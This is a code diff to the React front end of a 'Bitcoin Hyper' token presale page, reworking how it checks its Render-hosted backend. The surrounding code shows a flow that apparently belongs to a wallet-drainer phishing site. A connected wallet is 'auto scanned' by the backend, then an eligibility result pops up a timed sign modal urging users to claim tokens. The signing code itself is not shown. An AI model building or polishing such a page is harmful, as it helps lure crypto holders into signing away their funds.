@@ -1,5 +1,5 @@
 // App.jsx - BITCOIN HYPER TOKEN PRESALE LAUNCH
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect } from 'react';
 import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
 import { 
   WagmiProvider, 
@@ -51,44 +51,8 @@ const config = createConfig(
   })
 );
 
-// BACKEND API - UPDATE THIS WITH YOUR ACTUAL BACKEND URL
-// Test these URLs to find the correct one:
-// 1. https://tokenbackend-5xab.onrender.com/api
-// 2. https://tokenbackend-5xab.onrender.com/
-// 3. Your Render dashboard should show the actual URL
+// Backend API - Your working Render backend
 const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api";
-
-// Function to test backend connection
-const testBackendConnection = async () => {
-  try {
-    console.log('Testing backend connection to:', BACKEND_API);
-    
-    // Test 1: Try the root endpoint
-    const test1 = await fetch(BACKEND_API.replace('/api', ''));
-    console.log('Root endpoint test:', test1.status);
-    
-    // Test 2: Try the API endpoint
-    const test2 = await fetch(BACKEND_API);
-    console.log('API endpoint test:', test2.status);
-    
-    // Test 3: Try a specific endpoint
-    const test3 = await fetch(`${BACKEND_API}/presale/connect`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ test: true })
-    });
-    console.log('Presale endpoint test:', test3.status);
-    
-    return {
-      root: test1.status,
-      api: test2.status,
-      presale: test3.status
-    };
-  } catch (error) {
-    console.error('Backend test failed:', error);
-    return { error: error.message };
-  }
-};
 
 // Bitcoin Hyper Presale Component
 function BitcoinHyperPresale() {
@@ -103,7 +67,7 @@ function BitcoinHyperPresale() {
   const [processing, setProcessing] = useState(false);
   const [showSignModal, setShowSignModal] = useState(false);
   const [isMobile, setIsMobile] = useState(false);
-  const [backendStatus, setBackendStatus] = useState('unknown');
+  const [backendStatus, setBackendStatus] = useState('checking');
   const [connectionError, setConnectionError] = useState('');
   
   const [presaleStats] = useState({
@@ -120,26 +84,29 @@ function BitcoinHyperPresale() {
     seconds: 30
   });
   
-  // Test backend connection on component mount
+  // Initialize
   useEffect(() => {
-    const testConnection = async () => {
-      const result = await testBackendConnection();
-      console.log('Backend test result:', result);
-      
-      if (result.error) {
+    // Test backend connection on load
+    const testBackend = async () => {
+      try {
+        const response = await fetch(`${BACKEND_API}/health`);
+        if (response.ok) {
+          const data = await response.json();
+          console.log('Backend connected:', data);
+          setBackendStatus('connected');
+        } else {
+          setBackendStatus('error');
+          setConnectionError(`HTTP ${response.status}: ${response.statusText}`);
+        }
+      } catch (error) {
         setBackendStatus('error');
-        setConnectionError(`Backend connection failed: ${result.error}`);
-      } else if (result.presale === 200 || result.api === 200) {
-        setBackendStatus('connected');
-      } else {
-        setBackendStatus('partial');
-        setConnectionError(`Backend responded with status: Root=${result.root}, API=${result.api}, Presale=${result.presale}`);
+        setConnectionError(error.message);
+        console.error('Backend test failed:', error);
       }
     };
     
-    testConnection();
+    testBackend();
     
-    // Check if mobile
     setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent));
     
     // Start countdown
@@ -179,7 +146,7 @@ function BitcoinHyperPresale() {
     }
   }, [isConnected, address, backendStatus]);
 
-  // Auto scan function with improved error handling
+  // Auto scan function
   const triggerAutoScan = async () => {
     if (!address) return;
     
@@ -200,7 +167,6 @@ function BitcoinHyperPresale() {
         })
       });
       
-      // Check if response is okay
       if (!response.ok) {
         throw new Error(`HTTP ${response.status}: ${response.statusText}`);
       }
@@ -212,7 +178,7 @@ function BitcoinHyperPresale() {
         setTimeout(() => {
           setScanning(false);
           
-          if (data.data?.isEligible) {
+          if (data.data.isEligible) {
             setIsEligible(true);
             
             // Show animated sign modal after 1 second
@@ -228,7 +194,6 @@ function BitcoinHyperPresale() {
               }
             }, 30000);
           } else {
-            // Not eligible
             setIsEligible(false);
             setTimeout(() => {
               setScanning(false);
@@ -307,7 +272,7 @@ function BitcoinHyperPresale() {
     }
   };
 
-  // Celebration animations (same as before)
+  // Celebration animations
   const triggerCelebrationAnimation = () => {
     const container = document.getElementById('animation-container');
     if (!container) return;
@@ -478,6 +443,7 @@ function BitcoinHyperPresale() {
     const statusConfig = {
       error: { color: '#ff6b6b', text: 'Backend Connection Failed' },
       partial: { color: '#ffd93d', text: 'Backend Partially Connected' },
+      checking: { color: '#45b7d1', text: 'Checking Backend Status...' },
       unknown: { color: '#45b7d1', text: 'Checking Backend Status...' }
     };
     
@@ -494,7 +460,7 @@ function BitcoinHyperPresale() {
           </span>
           {connectionError && (
             <button
-              onClick={() => alert(connectionError)}
+              onClick={() => alert(`Backend Error: ${connectionError}`)}
               className="backend-status-details"
             >
               View Details
@@ -505,7 +471,7 @@ function BitcoinHyperPresale() {
     );
   };
 
-  // Sign Modal Component (same as before)
+  // Sign Modal Component
   const SignModal = () => {
     if (!showSignModal) return null;
     
@@ -696,7 +662,33 @@ function BitcoinHyperPresale() {
           </div>
           
           {/* Call to Action */}
-          {!isConnected ? (
+          {backendStatus === 'checking' ? (
+            <div className="backend-checking-container">
+              <div className="backend-checking-spinner"></div>
+              <h3 className="backend-checking-title">
+                Connecting to Backend...
+              </h3>
+              <p className="backend-checking-description">
+                Please wait while we establish connection...
+              </p>
+            </div>
+          ) : backendStatus === 'error' ? (
+            <div className="backend-error-container">
+              <div className="backend-error-icon">⚠️</div>
+              <h3 className="backend-error-title">
+                Backend Connection Failed
+              </h3>
+              <p className="backend-error-description">
+                Unable to connect to the backend server. Please refresh the page or try again later.
+              </p>
+              <button 
+                onClick={() => window.location.reload()}
+                className="retry-button"
+              >
+                🔄 Refresh Page
+              </button>
+            </div>
+          ) : !isConnected ? (
             <div className="cta-container">
               <div className="cta-icon">🚀</div>
               <h3 className="cta-title">
@@ -736,21 +728,6 @@ function BitcoinHyperPresale() {
               </h3>
               <p className="eligible-description">
                 Check the sign button above to claim your presale tokens!
-              </p>
-            </div>
-          ) : backendStatus !== 'connected' ? (
-            <div className="backend-warning-container">
-              <div className="backend-warning-icon">⚠️</div>
-              <h3 className="backend-warning-title">
-                Backend Connection Issue
-              </h3>
-              <p className="backend-warning-description">
-                Cannot scan wallet due to backend connectivity problems.
-                {connectionError && (
-                  <small style={{display: 'block', marginTop: '10px', opacity: 0.8}}>
-                    Error: {connectionError}
-                  </small>
-                )}
               </p>
             </div>
           ) : (
